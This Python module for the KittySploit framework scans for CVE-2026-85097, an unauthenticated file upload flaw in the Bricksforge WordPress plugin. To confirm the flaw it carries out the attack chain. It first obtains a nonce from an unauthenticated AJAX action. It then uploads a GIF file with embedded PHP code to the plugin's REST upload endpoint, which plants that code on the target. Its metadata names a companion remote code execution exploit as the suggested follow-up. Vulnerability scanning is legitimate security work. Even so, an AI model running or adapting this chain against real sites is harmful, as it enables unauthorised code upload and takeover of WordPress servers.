#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Bricksforge <= 3.1.8.9 unauth upload RCE (CVE-2026-85097)."""

import json
import re
import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "bricksforge"
_VULN_HIGH = (3, 1, 8)


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "Bricksforge CVE-2026-85097 detect",
        "description": "Detects bricksforge_regenerate_nonce + form_file_upload REST chain.",
        "author": ["KittySploit Team"],
        "severity": "critical",
        "cve": "CVE-2026-85097",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-85097"],
        "modules": ["exploits/multi/http/bricksforge_cve_2026_85097_upload_rce"],
        "tags": ["web", "scanner", "wordpress", "bricksforge", "file-upload", "cve-2026-85097"],
        "agent": {
            "approval_required": True,
            "chain": {
                "suggested_followups": ["exploits/multi/http/bricksforge_cve_2026_85097_upload_rce"],
            },
        },
    }

    base_path = OptString("/", "WordPress base path", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.base_path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def run(self):
        base = self.wp_normalize_base_path(self.base_path or "/")
        version = self.wp_plugin_version(_PLUGIN, base) or ""
        if version and not self.wp_version_in_range(version, (0, 0, 0), _VULN_HIGH):
            return False
        nonce_resp = self.http_request(
            method="POST",
            path=self._join("/wp-admin/admin-ajax.php"),
            headers={"X-Requested-With": "XMLHttpRequest"},
            data={"action": "bricksforge_regenerate_nonce"},
            allow_redirects=False,
        )
        if not nonce_resp:
            return False
        try:
            payload = json.loads(nonce_resp.text or "{}")
            bf_nonce = payload.get("data", {}).get("nonce") or payload.get("nonce")
        except json.JSONDecodeError:
            m = re.search(r'"nonce"\s*:\s*"([^"]+)"', nonce_resp.text or "")
            bf_nonce = m.group(1) if m else ""
        if not bf_nonce:
            return False
        marker = secrets.token_hex(6)
        gif = f"ks{secrets.token_hex(3)}.gif"
        bnd = "BFProbeUpload7391625"
        body = (
            f"--{bnd}\r\nContent-Disposition: form-data; name=\"file[]\"; filename=\"{gif}\"\r\n"
            f"Content-Type: image/gif\r\n\r\nGIF89a<?php echo '{marker}'; ?>\r\n"
            f"--{bnd}--\r\n"
        )
        up = self.http_request(
            method="POST",
            path=self._join("/wp-json/bricksforge/v1/form_file_upload"),
            headers={"X-WP-Nonce": bf_nonce, "Content-Type": f"multipart/form-data; boundary={bnd}"},
            data=body.encode(),
            allow_redirects=False,
        )
        if up and int(up.status_code or 0) in (200, 201) and ".gif" in (up.text or ""):
            self.set_info(
                severity="critical",
                reason="Bricksforge unauthenticated form_file_upload accepted",
                cve="CVE-2026-85097",
            )
            return True
        return False
